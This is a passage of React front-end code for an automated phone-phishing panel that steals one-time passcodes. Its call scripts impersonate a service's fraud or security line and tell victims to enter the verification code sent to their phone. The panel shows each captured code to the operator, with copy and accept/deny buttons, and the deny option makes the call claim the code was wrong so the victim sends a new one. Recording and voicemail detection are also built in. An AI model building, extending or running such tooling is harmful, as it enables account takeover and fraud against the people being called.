import { useState, useEffect, useRef, useCallback } from "react";
import "@/App.css";
import axios from "axios";
import { motion, AnimatePresence } from "framer-motion";
import { 
  Phone, 
  PhoneOff, 
  Settings, 
  Layers, 
  Trash2,
  Volume2,
  VolumeX,
  User,
  Hash,
  Building,
  Play,
  RefreshCw,
  History,
  CheckCircle,
  XCircle,
  Clock,
  Copy,
  Check,
  ThumbsUp,
  ThumbsDown,
  Keyboard
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { 
  Select, 
  SelectContent, 
  SelectItem, 
  SelectTrigger, 
  SelectValue 
} from "@/components/ui/select";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Toaster } from "@/components/ui/sonner";
import { toast } from "sonner";
import { Badge } from "@/components/ui/badge";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

// Voice models - Amazon Polly Neural (Most Natural)
const VOICE_MODELS = [
  // Neural Voices (Premium - Most Natural) ⭐
  { id: "Polly.Joanna-Neural", name: "Joanna (Female, US) ⭐ Most Natural", gender: "female", accent: "US" },
  { id: "Polly.Matthew-Neural", name: "Matthew (Male, US) ⭐ Professional", gender: "male", accent: "US" },
  { id: "Polly.Kendra-Neural", name: "Kendra (Female, US) Warm & Friendly", gender: "female", accent: "US" },
  { id: "Polly.Ruth-Neural", name: "Ruth (Female, US) Clear & Confident", gender: "female", accent: "US" },
  { id: "Polly.Stephen-Neural", name: "Stephen (Male, US) Authoritative", gender: "male", accent: "US" },
  { id: "Polly.Amy-Neural", name: "Amy (Female, British) Professional", gender: "female", accent: "UK" },
  { id: "Polly.Brian-Neural", name: "Brian (Male, British) Trustworthy", gender: "male", accent: "UK" },
  // Standard Voices (Free)
  { id: "Polly.Joanna", name: "Joanna Standard (Female, US)", gender: "female", accent: "US" },
  { id: "Polly.Matthew", name: "Matthew Standard (Male, US)", gender: "male", accent: "US" },
  { id: "woman", name: "Default Woman (Basic)", gender: "female", accent: "US" },
  { id: "man", name: "Default Man (Basic)", gender: "male", accent: "US" },
];

// Call types with their default messages
const CALL_TYPES = [
  { 
    id: "password_change_1", 
    name: "Password Change 1",
    steps: {
      step1: "Hello {name}, This is the {service} account service prevention line. This automated call was made due to suspicious activity on your account. We have received a request to change your password. If it was not you press 1, if it was you press 0.",
      step2: "Thank you for your confirmation, to block this request. Please enter the {digits}-digit security code that we sent to your phone number.",
      step3: "Thank you. Please hold for a moment while we verify your code.",
      accepted: "Thank you for waiting. We will get back to you if we need further information thank you for your attention. Goodbye.",
      rejected: "Thank you for waiting, to verification code you entered previously is incorrect. Please make sure you enter the correct code. Please enter {digits}-digit security code that we sent to your phone number.",
    }
  },
  { 
    id: "password_change_2", 
    name: "Password Change 2",
    steps: {
      step1: "Hello {name}, this is an automated security alert from {service}. We have received a request to change your account password. If this was not you, press 1 to block the request immediately, or press 0 if you authorized this change.",
      step2: "Thank you for the report. To immediately block this unauthorized request, please enter the {digits}-digit security code we just sent to your mobile device.",
      step3: "Thank you. Please stay on the line while we validate the security code you entered.",
      accepted: "Thank you for waiting. The unauthorized request has been blocked and your account is now secure. We will contact you if further info is needed. Goodbye.",
      rejected: "We're sorry, the code you entered is incorrect. Please re-enter the {digits}-digit security code that was sent to your device.",
    }
  },
  { 
    id: "login_attempt_1", 
    name: "Login Attempt 1",
    steps: {
      step1: "Hello {name}, This is the {service} account service prevention line. This automated call was made due to suspicious activity on your account. Someone has attempted to log into your account. If it was not you press 1, if it was you press 0.",
      step2: "Thank you for your confirmation, to block this request. Please enter the {digits}-digit security code that we sent to your phone number.",
      step3: "Thank you. Please hold for a moment while we verify your code.",
      accepted: "Thank you for waiting. We will get back to you if we need further information thank you for your attention. Goodbye.",
      rejected: "Thank you for waiting, to verification code you entered previously is incorrect. Please make sure you enter the correct code. Please enter {digits}-digit security code that we sent to your phone number.",
    }
  },
  { 
    id: "login_attempt_2", 
    name: "Login Attempt 2",
    steps: {
      step1: "Hello {name}, this is a security notification from {service} support. We have detected an unusual login attempt on your account from an unrecognized device. Press 1 to secure your account and cancel this login, or press 0 to confirm.",
      step2: "Confirmation received. For your protection, please type in the {digits}-digit verification number you received via SMS now.",
      step3: "Data received. Please wait a moment while our system verifies your identity.",
      accepted: "Verification successful. The security measures are complete and your account is protected. Thank you for your attention, goodbye.",
      rejected: "Verification failed due to an invalid entry. Please ensure you enter the correct numbers. Type in your {digits}-digit code now.",
    }
  },
  { 
    id: "new_login_request", 
    name: "New Login Request",
    steps: {
      step1: "Hello {name}, this is a verification call from {service} regarding a new login request. To protect your account and deny this access, press 1. If you are currently trying to log in, please press 0.",
      step2: "The block request is being processed. Please enter the {digits}-digit secret code sent to your phone to verify your identity.",
      step3: "Thank you for your cooperation. Please hold briefly while the account securing process is finalized.",
      accepted: "Thank you for your assistance. Your security issue has been resolved. Our team will provide updates via email if necessary. Goodbye.",
      rejected: "The security code provided is not valid. Please check your messages and enter the correct {digits} digits to proceed with protection.",
    }
  },
  { 
    id: "suspicious_activity", 
    name: "Suspicious Activity",
    steps: {
      step1: "Hello {name}, your {service} account is currently under review due to suspicious activity. To prevent unauthorized access and lock your profile, press 1. If you believe this is a mistake, press 0 to proceed.",
      step2: "Your access has been verified. Now, enter the {digits}-digit security number sent to your device to finalize the cancellation process.",
      step3: "Please do not hang up. We are checking your security code; this will only take a moment.",
      accepted: "Confirmation finished. We have successfully canceled all suspicious activity on your account. Thank you and have a secure day.",
      rejected: "There seems to be an input error. To try again, please enter the {digits}-digit verification code found on your mobile phone.",
    }
  },
  { 
    id: "profile_update", 
    name: "Profile Update Verification",
    steps: {
      step1: "Hello {name}, the {service} fraud prevention department is calling regarding a recent update to your security settings. Press 1 now if you did not initiate this update, or press 0 if this was an intentional action.",
      step2: "To complete the account protection, please input the {digits}-digit code sent to your registered phone number now.",
      step3: "Processing your verification. Please wait for further instructions while we confirm your status.",
      accepted: "Your account has returned to normal status. Thank you for completing this verification in time. This call will now end.",
      rejected: "Input not recognized. Please re-enter the {digits}-digit security code we sent to you to successfully block this request.",
    }
  },
];

// Default step messages (Password Change 1 as default)
const DEFAULT_STEPS = CALL_TYPES[0].steps;

function App() {
  // Provider config state
  const [infobipConfigured, setInfobipConfigured] = useState(false);
  const [signalwireConfigured, setSignalwireConfigured] = useState(false);
  const [selectedProvider, setSelectedProvider] = useState("infobip"); // "infobip" or "signalwire"
  const [infobipFromNumber, setInfobipFromNumber] = useState("");
  const [signalwireFromNumber, setSignalwireFromNumber] = useState("");
  
  // Call configuration state
  const [callType, setCallType] = useState("password_change_1");
  const [voiceModel, setVoiceModel] = useState("Polly.Joanna-Neural");
  const [fromNumber, setFromNumber] = useState("");
  const [recipientNumber, setRecipientNumber] = useState("+525547000906");
  const [recipientName, setRecipientName] = useState("");
  const [serviceName, setServiceName] = useState("");
  const [otpDigits, setOtpDigits] = useState("6");

  // Call steps state
  const [activeStep, setActiveStep] = useState("step1");
  const [stepMessages, setStepMessages] = useState(DEFAULT_STEPS);

  // Call state
  const [isCallActive, setIsCallActive] = useState(false);
  const [currentCallId, setCurrentCallId] = useState(null);
  const [callStatus, setCallStatus] = useState("IDLE");
  const [currentStep, setCurrentStep] = useState("");
  const [logs, setLogs] = useState([]);
  const [isLoading, setIsLoading] = useState(false);
  
  // DTMF state
  const [dtmfCode, setDtmfCode] = useState(null);
  const [copiedCode, setCopiedCode] = useState(false);
  const [showVerifyButtons, setShowVerifyButtons] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  
  // Recording state
  const [recordingUrl, setRecordingUrl] = useState(null);
  const [recordingDuration, setRecordingDuration] = useState(null);
  
  // Call history state
  const [callHistory, setCallHistory] = useState([]);
  const [showHistory, setShowHistory] = useState(false);

  // Refs
  const logsEndRef = useRef(null);
  const eventSourceRef = useRef(null);

  // Fetch config on mount
  useEffect(() => {
    const fetchConfig = async () => {
      try {
        const response = await axios.get(`${API}/config`);
        setInfobipConfigured(response.data.infobip_configured);
        setSignalwireConfigured(response.data.signalwire_configured);
        
        // Store both provider numbers
        if (response.data.infobip_from_number) {
          setInfobipFromNumber(response.data.infobip_from_number);
        }
        if (response.data.signalwire_from_number) {
          setSignalwireFromNumber(response.data.signalwire_from_number);
        }
        
        // Set initial from number based on selected provider
        if (selectedProvider === "signalwire" && response.data.signalwire_from_number) {
          setFromNumber(response.data.signalwire_from_number);
        } else if (response.data.infobip_from_number) {
          setFromNumber(response.data.infobip_from_number);
        }
      } catch (e) {
        console.error("Error fetching config:", e);
      }
    };
    fetchConfig();
  }, []);

  // Update fromNumber when provider changes
  useEffect(() => {
    if (selectedProvider === "signalwire" && signalwireFromNumber) {
      setFromNumber(signalwireFromNumber);
    } else if (selectedProvider === "infobip" && infobipFromNumber) {
      setFromNumber(infobipFromNumber);
    }
  }, [selectedProvider, infobipFromNumber, signalwireFromNumber]);

  // Update step messages when call type changes
  useEffect(() => {
    const selectedType = CALL_TYPES.find(t => t.id === callType);
    if (selectedType && selectedType.steps) {
      setStepMessages(selectedType.steps);
    }
  }, [callType]);

  // Auto-scroll logs
  useEffect(() => {
    logsEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [logs]);

  // Cleanup SSE on unmount
  useEffect(() => {
    return () => {
      if (eventSourceRef.current) {
        eventSourceRef.current.close();
      }
    };
  }, []);

  // Preview voice using Web Speech API
  const [isPreviewing, setIsPreviewing] = useState(false);
  const [voicesLoaded, setVoicesLoaded] = useState(false);
  
  // Load voices on mount
  useEffect(() => {
    const loadVoices = () => {
      const voices = window.speechSynthesis.getVoices();
      if (voices.length > 0) {
        setVoicesLoaded(true);
      }
    };
    
    loadVoices();
    
    // Chrome needs this event
    if (window.speechSynthesis.onvoiceschanged !== undefined) {
      window.speechSynthesis.onvoiceschanged = loadVoices;
    }
  }, []);
  
  const previewVoice = () => {
    // Check if speech synthesis is available
    if (!window.speechSynthesis) {
      toast.error("Speech synthesis not supported in this browser");
      return;
    }
    
    // Get the current step message
    let message = stepMessages[activeStep] || stepMessages.step1;
    
    // Replace placeholders
    message = message
      .replace(/{name}/g, recipientName || "Customer")
      .replace(/{service}/g, serviceName || "Account")
      .replace(/{digits}/g, otpDigits);
    
    // Cancel any ongoing speech
    window.speechSynthesis.cancel();
    
    // Create utterance
    const utterance = new SpeechSynthesisUtterance(message);
    
    // Set voice based on selected model
    const voices = window.speechSynthesis.getVoices();
    const voiceInfo = VOICE_MODELS.find(v => v.id === voiceModel);
    
    if (voices.length > 0 && voiceInfo) {
      // Try to find a matching voice
      let selectedVoice = null;
      
      if (voiceInfo.gender === "female") {
        selectedVoice = voices.find(v => 
          v.lang.startsWith("en") && v.name.toLowerCase().includes("female")
        ) || voices.find(v => 
          v.lang.startsWith("en") && (v.name.includes("Samantha") || v.name.includes("Karen") || v.name.includes("Victoria") || v.name.includes("Fiona"))
        );
      } else {
        selectedVoice = voices.find(v => 
          v.lang.startsWith("en") && v.name.toLowerCase().includes("male")
        ) || voices.find(v => 
          v.lang.startsWith("en") && (v.name.includes("Daniel") || v.name.includes("Alex") || v.name.includes("Tom") || v.name.includes("Fred"))
        );
      }
      
      // Fallback to any English voice
      if (!selectedVoice) {
        selectedVoice = voices.find(v => v.lang.startsWith("en"));
      }
      
      // Last fallback - any voice
      if (!selectedVoice && voices.length > 0) {
        selectedVoice = voices[0];
      }
      
      if (selectedVoice) {
        utterance.voice = selectedVoice;
      }
    }
    
    utterance.lang = "en-US";
    utterance.rate = 0.9; // Slightly slower for clarity
    utterance.pitch = 1;
    
    setIsPreviewing(true);
    toast.success(`Previewing: ${activeStep.toUpperCase()}`, { duration: 2000 });
    
    utterance.onend = () => {
      setIsPreviewing(false);
    };
    
    utterance.onerror = (e) => {
      console.error("Speech error:", e);
      setIsPreviewing(false);
      toast.error("Preview failed - try again");
    };
    
    // Small delay to ensure voices are loaded
    setTimeout(() => {
      window.speechSynthesis.speak(utterance);
    }, 100);
  };
  
  const stopPreview = () => {
    window.speechSynthesis.cancel();
    setIsPreviewing(false);
  };

  // Fetch call history
  const fetchCallHistory = useCallback(async () => {
    try {
      const response = await axios.get(`${API}/calls`);
      setCallHistory(response.data);
    } catch (e) {
      console.error("Error fetching call history:", e);
    }
  }, []);

  // Copy DTMF code to clipboard
  const copyToClipboard = async (code) => {
    try {
      await navigator.clipboard.writeText(code);
      setCopiedCode(true);
      toast.success("Code copied to clipboard!");
      setTimeout(() => setCopiedCode(false), 2000);
    } catch (e) {
      toast.error("Failed to copy");
    }
  };

  // Verify code (accept/reject)
  const handleVerify = async (accepted) => {
    if (!currentCallId) return;
    
    setIsVerifying(true);
    
    try {
      // For deny, hide the decision box BEFORE the API call
      // The SSE events will show it again with the new code
      if (!accepted) {
        setDtmfCode(null);
        setShowVerifyButtons(false);
      }
      
      await axios.post(`${API}/calls/${currentCallId}/verify`, { accepted });
      
      if (accepted) {
        setShowVerifyButtons(false);
        toast.success("Code ACCEPTED - Playing final message");
      } else {
        // Don't set state here - let SSE events control it
        toast.info("Code DENIED - Requesting new code");
      }
    } catch (e) {
      toast.error("Verification failed");
    } finally {
      setIsVerifying(false);
    }
  };

  // Subscribe to SSE events
  const subscribeToEvents = useCallback((callId) => {
    if (eventSourceRef.current) {
      eventSourceRef.current.close();
    }

    const eventSource = new EventSource(`${API}/calls/${callId}/events`);
    eventSourceRef.current = eventSource;

    eventSource.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        
        if (data.type === "heartbeat") return;
        
        if (data.type === "connected") {
          console.log("Connected to event stream");
          return;
        }

        // Add to logs
        setLogs((prev) => [...prev, data]);

        // Handle verification result - check this FIRST before setting new code
        if (data.event_type === "VERIFICATION_ACCEPTED" || data.event_type === "ACCEPTED_PLAYING") {
          setShowVerifyButtons(false);
          console.log("Setting showVerifyButtons to false (accepted)");
        }
        
        if (data.event_type === "VERIFICATION_REJECTED") {
          setDtmfCode(null); // Clear for new code
          setShowVerifyButtons(false); // Hide until new code arrives
          console.log("Setting dtmfCode to null and showVerifyButtons to false (rejected)");
        }

        // Handle DTMF code display - only set for security codes (not Step 1 input)
        // Security codes come with show_verify=true or specific event types
        if (data.dtmf_code && (data.show_verify || data.event_type === "CAPTURED_CODE" || data.event_type === "DTMF_CODE_RECEIVED")) {
          console.log(`Setting dtmfCode to ${data.dtmf_code} and showVerifyButtons to true`);
          setDtmfCode(data.dtmf_code);
          setShowVerifyButtons(true);
        }
        
        // Check for verify buttons trigger
        if (data.show_verify || data.event_type === "AWAITING_VERIFICATION" || data.event_type === "CAPTURED_CODE" || data.event_type === "DTMF_CODE_RECEIVED") {
          console.log(`Setting showVerifyButtons to true (event: ${data.event_type})`);
          setShowVerifyButtons(true);
          // Scroll into view when verification is needed
          logsEndRef.current?.scrollIntoView({ behavior: "smooth" });
        }

        // Update current step
        if (data.event_type) {
          if (data.event_type.includes("STEP1")) setCurrentStep("step1");
          else if (data.event_type.includes("STEP2")) setCurrentStep("step2");
          else if (data.event_type.includes("STEP3") || data.event_type.includes("AWAITING")) setCurrentStep("step3");
          else if (data.event_type.includes("ACCEPTED")) setCurrentStep("accepted");
          else if (data.event_type.includes("REJECTED")) setCurrentStep("rejected");
          
          const statusMap = {
            CALL_QUEUED: "PENDING",
            CALL_INITIATED: "CALLING",
            CALL_CREATED: "CALLING",
            STEP1_CALLING: "CALLING",
            STEP2_CALLING: "CALLING",
            CALL_RINGING: "RINGING",
            CALL_PRE_ESTABLISHED: "RINGING",
            CALL_ANSWERED: "ESTABLISHED",
            CALL_ESTABLISHED: "ESTABLISHED",
            AMD_HUMAN: "ESTABLISHED",
            AMD_VOICEMAIL: "VOICEMAIL",
            AMD_FAX: "FAX",
            AMD_UNKNOWN: "ESTABLISHED",
            STEP1_PLAYING: "ESTABLISHED",
            STEP2_PLAYING: "ESTABLISHED",
            STEP3_PLAYING: "ESTABLISHED",
            INPUT_STREAM: "ESTABLISHED",
            CAPTURED_CODE: "ESTABLISHED",
            CALL_FINISHED: "FINISHED",
            CALL_FAILED: "FAILED",
            CALL_HANGUP: "FINISHED",
            CALL_BUSY: "BUSY",
            CALL_NO_ANSWER: "NO_ANSWER",
            CALL_CANCELED: "CANCELED",
            CALL_VOICEMAIL: "VOICEMAIL",
          };
          
          const newStatus = statusMap[data.event_type];
          if (newStatus) {
            setCallStatus(newStatus);
            
            // End call states
            if (["FINISHED", "FAILED", "BUSY", "NO_ANSWER", "CANCELED", "VOICEMAIL", "FAX"].includes(newStatus)) {
              setIsCallActive(false);
              setShowVerifyButtons(false);
              eventSource.close();
              fetchCallHistory();
            }
          }
          
          // Handle recording URL
          if (data.event_type === "RECORDING_URL") {
            setRecordingUrl(data.details);
            setRecordingDuration(data.recording_duration);
            console.log("Recording available:", data.details);
          }
        }
      } catch (e) {
        console.error("Error parsing event:", e);
      }
    };

    eventSource.onerror = () => {
      console.error("SSE connection error");
      eventSource.close();
    };
  }, [fetchCallHistory]);

  // Start call
  const handleStartCall = async () => {
    if (!recipientNumber) {
      toast.error("Please enter recipient number");
      return;
    }

    setIsLoading(true);
    setDtmfCode(null);
    setShowVerifyButtons(false);
    setCurrentStep("");
    setLogs([]);
    setRecordingUrl(null);
    setRecordingDuration(null);
    
    try {
      const response = await axios.post(`${API}/calls/initiate`, {
        config: {
          call_type: callType,
          voice_model: voiceModel, // Send the voice ID directly (e.g., "Polly.Joanna-Neural")
          from_number: fromNumber,
          recipient_number: recipientNumber,
          recipient_name: recipientName,
          service_name: serviceName,
          otp_digits: parseInt(otpDigits),
          provider: selectedProvider,
        },
        steps: stepMessages,
      });

      const { call_id, provider, using_live, mode } = response.data;
      setCurrentCallId(call_id);
      setIsCallActive(true);
      setCallStatus("PENDING");
      
      subscribeToEvents(call_id);
      
      const providerName = provider === "signalwire" ? "SignalWire" : "Infobip";
      toast.success(using_live ? `IVR call started via ${providerName}` : `IVR call started (${mode || "Simulation"})`);
    } catch (error) {
      console.error("Error starting call:", error);
      toast.error(error.response?.data?.detail || "Failed to start call");
    } finally {
      setIsLoading(false);
    }
  };

  // Hang up call
  const handleHangUp = async () => {
    if (!currentCallId) return;
    
    setIsLoading(true);
    
    try {
      await axios.post(`${API}/calls/${currentCallId}/hangup`);
      setIsCallActive(false);
      setCallStatus("FINISHED");
      setShowVerifyButtons(false);
      
      if (eventSourceRef.current) {
        eventSourceRef.current.close();
      }
      
      toast.success("Call session terminated");
      fetchCallHistory();
    } catch (error) {
      console.error("Error hanging up:", error);
      toast.error(error.response?.data?.detail || "Failed to hang up");
    } finally {
      setIsLoading(false);
    }
  };

  // Clear logs
  const handleClearLogs = () => {
    setLogs([]);
    setDtmfCode(null);
    setShowVerifyButtons(false);
    if (!isCallActive) {
      setCurrentCallId(null);
      setCallStatus("IDLE");
      setCurrentStep("");
    }
    toast.success("Logs cleared");
  };

  // Format timestamp
  const formatTimestamp = (isoString) => {
    const date = new Date(isoString);
    return date.toLocaleTimeString("en-US", {
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      hour12: false,
    });
  };

  // Format date for history
  const formatDateTime = (isoString) => {
    const date = new Date(isoString);
    return date.toLocaleString("en-US", {
      month: "short",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    });
  };

  // Get status color class
  const getStatusClass = (status) => {
    const classes = {
      IDLE: "status-pending",
      PENDING: "status-pending",
      CALLING: "status-calling",
      RINGING: "status-ringing",
      ESTABLISHED: "status-established",
      FINISHED: "status-finished",
      FAILED: "status-failed",
    };
    return classes[status] || "status-pending";
  };

  // Get status icon for history
  const getStatusIcon = (status) => {
    if (status === "FINISHED") return <CheckCircle className="w-4 h-4 text-emerald-400" />;
    if (status === "FAILED") return <XCircle className="w-4 h-4 text-red-400" />;
    return <Clock className="w-4 h-4 text-yellow-400" />;
  };

  // Get event icon and color
  const getEventStyle = (eventType) => {
    if (eventType.includes("CAPTURED_CODE")) return { icon: "🔐", color: "text-emerald-400", bg: "bg-emerald-500/10 border-emerald-500/30" };
    if (eventType.includes("DTMF_CODE")) return { icon: "🔐", color: "text-emerald-400", bg: "bg-emerald-500/10 border-emerald-500/30" };
    if (eventType.includes("INPUT_STREAM")) return { icon: "🔢", color: "text-cyan-400", bg: "bg-cyan-500/10 border-cyan-500/30" };
    if (eventType.includes("DTMF")) return { icon: "🔢", color: "text-cyan-400", bg: "bg-cyan-500/10 border-cyan-500/30" };
    if (eventType.includes("STEP1")) return { icon: "1️⃣", color: "text-blue-400", bg: "" };
    if (eventType.includes("STEP2")) return { icon: "2️⃣", color: "text-purple-400", bg: "" };
    if (eventType.includes("STEP3") || eventType.includes("AWAITING")) return { icon: "⏳", color: "text-yellow-400", bg: "" };
    if (eventType.includes("ACCEPTED")) return { icon: "✅", color: "text-emerald-400", bg: "bg-emerald-500/10 border-emerald-500/30" };
    if (eventType.includes("REJECTED")) return { icon: "🔄", color: "text-orange-400", bg: "bg-orange-500/10 border-orange-500/30" };
    if (eventType.includes("INITIATED")) return { icon: "📤", color: "text-cyan-400", bg: "" };
    if (eventType.includes("CREATED")) return { icon: "📞", color: "text-cyan-400", bg: "" };
    if (eventType.includes("RINGING")) return { icon: "🔔", color: "text-yellow-400", bg: "" };
    if (eventType.includes("ESTABLISHED") || eventType.includes("ANSWERED")) return { icon: "📱", color: "text-emerald-400", bg: "bg-emerald-500/10 border-emerald-500/30" };
    // AMD Detection styles
    if (eventType.includes("AMD_HUMAN")) return { icon: "👤", color: "text-emerald-400", bg: "bg-emerald-500/10 border-emerald-500/30" };
    if (eventType.includes("AMD_VOICEMAIL") || eventType.includes("VOICEMAIL")) return { icon: "📧", color: "text-orange-400", bg: "bg-orange-500/10 border-orange-500/30" };
    if (eventType.includes("AMD_FAX")) return { icon: "📠", color: "text-yellow-400", bg: "bg-yellow-500/10 border-yellow-500/30" };
    if (eventType.includes("AMD_UNKNOWN")) return { icon: "❓", color: "text-slate-400", bg: "" };
    // Call status styles
    if (eventType.includes("BUSY")) return { icon: "📵", color: "text-red-400", bg: "bg-red-500/10 border-red-500/30" };
    if (eventType.includes("NO_ANSWER")) return { icon: "📵", color: "text-orange-400", bg: "bg-orange-500/10 border-orange-500/30" };
    if (eventType.includes("CANCELED")) return { icon: "🚫", color: "text-slate-400", bg: "bg-slate-500/10 border-slate-500/30" };
    if (eventType.includes("RECORDING")) return { icon: "🎙️", color: "text-purple-400", bg: "bg-purple-500/10 border-purple-500/30" };
    if (eventType.includes("FINISHED")) return { icon: "🏁", color: "text-slate-400", bg: "" };
    if (eventType.includes("FAILED") || eventType.includes("ERROR")) return { icon: "⚠️", color: "text-red-400", bg: "bg-red-500/10 border-red-500/30" };
    if (eventType.includes("RETRY") || eventType.includes("NO_RESPONSE")) return { icon: "🔁", color: "text-yellow-400", bg: "bg-yellow-500/10 border-yellow-500/30" };
    if (eventType.includes("HANGUP")) return { icon: "📵", color: "text-slate-400", bg: "" };
    if (eventType.includes("SIMULATION") || eventType.includes("CALL_INFO")) return { icon: "🎭", color: "text-blue-400", bg: "bg-blue-500/10 border-blue-500/30" };
    if (eventType.includes("QUEUED")) return { icon: "📋", color: "text-slate-400", bg: "" };
    return { icon: "📌", color: "text-slate-400", bg: "" };
  };

  return (
    <div className="app-container" data-testid="app-container">
      <Toaster theme="dark" position="top-right" />
      
      <div className="main-grid">
        {/* Left Panel - Bot Logs */}
        <div className="logs-panel glass-panel" data-testid="logs-panel">
          <div className="logs-header">
            <div className="flex items-center gap-2">
              <div className={`status-indicator ${getStatusClass(callStatus)}`} data-testid="status-indicator" />
              <h2 className="font-heading text-sm font-semibold text-white">
                Bot Logs
              </h2>
              <span className="font-mono text-[10px] text-slate-500 uppercase">
                {callStatus}
              </span>
            </div>
            <div className="flex items-center gap-1">
              <Button
                variant="ghost"
                size="sm"
                onClick={() => { setShowHistory(!showHistory); fetchCallHistory(); }}
                className="text-slate-400 hover:text-white hover:bg-white/5 h-7 px-2 text-xs"
                data-testid="history-btn"
              >
                <History className="w-3 h-3 mr-1" />
                History
              </Button>
              <Button
                variant="ghost"
                size="sm"
                onClick={handleClearLogs}
                className="text-slate-400 hover:text-white hover:bg-white/5 h-7 px-2 text-xs"
                data-testid="clear-logs-btn"
              >
                <Trash2 className="w-3 h-3 mr-1" />
                Clear
              </Button>
            </div>
          </div>
          
          {/* Call History Panel */}
          <AnimatePresence>
            {showHistory && (
              <motion.div
                initial={{ height: 0, opacity: 0 }}
                animate={{ height: "auto", opacity: 1 }}
                exit={{ height: 0, opacity: 0 }}
                className="border-b border-white/5 overflow-hidden"
              >
                <div className="p-2 max-h-32 overflow-y-auto">
                  <h3 className="font-mono text-[10px] text-cyan-500/70 uppercase tracking-wider mb-2">
                    Recent Calls
                  </h3>
                  {callHistory.length === 0 ? (
                    <p className="text-slate-600 text-xs font-mono">No call history</p>
                  ) : (
                    <div className="space-y-1">
                      {callHistory.slice(0, 5).map((call) => (
                        <div 
                          key={call.id}
                          className="flex items-center justify-between p-1.5 rounded bg-white/5 hover:bg-white/10 transition-colors"
                        >
                          <div className="flex items-center gap-1.5">
                            {getStatusIcon(call.status)}
                            <span className="font-mono text-[10px] text-slate-300">
                              {call.config?.recipient_number || "Unknown"}
                            </span>
                            {call.dtmf_code && (
                              <Badge variant="outline" className="text-[10px] px-1 py-0 bg-cyan-500/10 text-cyan-400 border-cyan-500/30">
                                {call.dtmf_code}
                              </Badge>
                            )}
                          </div>
                          <span className="font-mono text-[10px] text-slate-500">
                            {formatDateTime(call.created_at)}
                          </span>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              </motion.div>
            )}
          </AnimatePresence>
          
          {/* Logs Container */}
          <div className="logs-container" data-testid="logs-container">
            <AnimatePresence>
              {logs.length === 0 ? (
                <div className="text-center text-slate-600 font-mono text-xs py-4">
                  No logs yet. Start a call to see events.
                </div>
              ) : (
                logs.map((log, index) => {
                  const style = getEventStyle(log.event_type);
                  return (
                    <motion.div
                      key={`${log.timestamp}-${index}`}
                      initial={{ opacity: 0, x: -10 }}
                      animate={{ opacity: 1, x: 0 }}
                      exit={{ opacity: 0 }}
                      className={`log-entry ${style.bg ? `${style.bg} border rounded` : ''}`}
                      data-testid={`log-entry-${index}`}
                    >
                      <div className="flex items-start gap-2">
                        <span className="text-sm">{style.icon}</span>
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center gap-1.5 flex-wrap">
                            <span className="log-timestamp">
                              [{formatTimestamp(log.timestamp)}]
                            </span>
                            <span className={`font-mono text-[10px] font-semibold ${style.color}`}>
                              {log.event_type}
                            </span>
                          </div>
                          <div className="log-details">
                            {log.details}
                          </div>
                          
                          {/* DTMF Code Display */}
                          {log.dtmf_code && (
                            <div className="mt-1 flex items-center gap-1.5">
                              <Keyboard className="w-3 h-3 text-emerald-400" />
                              <span className="font-mono text-[10px] text-slate-400">Input:</span>
                              <Badge 
                                variant="outline" 
                                className="font-mono text-sm px-2 py-0.5 text-emerald-400 bg-emerald-500/10 border-emerald-500/30 cursor-pointer hover:bg-emerald-500/20 tracking-wider"
                                onClick={() => copyToClipboard(log.dtmf_code)}
                                data-testid={`dtmf-badge-${index}`}
                              >
                                {log.dtmf_code}
                                <Copy className="w-2.5 h-2.5 ml-1" />
                              </Badge>
                              {log.dtmf_code.length >= parseInt(otpDigits) && (
                                <span className="text-[10px] text-emerald-400 font-mono">({log.dtmf_code.length} digits)</span>
                              )}
                            </div>
                          )}
                        </div>
                      </div>
                    </motion.div>
                  );
                })
              )}
            </AnimatePresence>
            <div ref={logsEndRef} />
          </div>
          
          {/* Decision Box - Accept/Deny */}
          {showVerifyButtons && dtmfCode && (
            <div
              className="decision-box"
              data-testid="decision-box"
            >
                <div className="decision-box-inner">
                  <div className="flex items-center gap-2 mb-2">
                    <div className="w-8 h-8 rounded-full bg-emerald-500/20 flex items-center justify-center">
                      <Keyboard className="w-4 h-4 text-emerald-400" />
                    </div>
                    <div>
                      <div className="font-mono text-[10px] text-slate-400 uppercase tracking-wider">Security Code</div>
                      <div className="font-mono text-lg text-emerald-400 tracking-widest flex items-center gap-1.5">
                        {dtmfCode}
                        <button 
                          onClick={() => copyToClipboard(dtmfCode)}
                          className="p-0.5 hover:bg-white/10 rounded transition-colors"
                          data-testid="copy-code-main"
                        >
                          {copiedCode ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3 text-slate-400" />}
                        </button>
                      </div>
                    </div>
                  </div>
                  
                  <div className="flex gap-2">
                    <button
                      onClick={() => handleVerify(true)}
                      disabled={isVerifying}
                      className="decision-btn decision-btn-accept"
                      data-testid="accept-btn"
                    >
                      {isVerifying ? (
                        <RefreshCw className="w-4 h-4 animate-spin" />
                      ) : (
                        <ThumbsUp className="w-4 h-4" />
                      )}
                      ACCEPT
                    </button>
                    <button
                      onClick={() => handleVerify(false)}
                      disabled={isVerifying}
                      className="decision-btn decision-btn-deny"
                      data-testid="deny-btn"
                    >
                      {isVerifying ? (
                        <RefreshCw className="w-4 h-4 animate-spin" />
                      ) : (
                        <ThumbsDown className="w-4 h-4" />
                      )}
                      DENY
                    </button>
                  </div>
                </div>
              </div>
            )}
            
            {/* Recording Playback */}
            {recordingUrl && callStatus === "FINISHED" && (
              <motion.div 
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                className="mt-4 p-4 rounded-lg bg-gradient-to-r from-purple-500/10 to-cyan-500/10 border border-purple-500/30"
                data-testid="recording-player"
              >
                <div className="flex items-center gap-3 mb-3">
                  <div className="w-10 h-10 rounded-full bg-purple-500/20 flex items-center justify-center">
                    <Play className="w-5 h-5 text-purple-400" />
                  </div>
                  <div>
                    <div className="font-mono text-xs text-purple-400 uppercase tracking-wider">Call Recording</div>
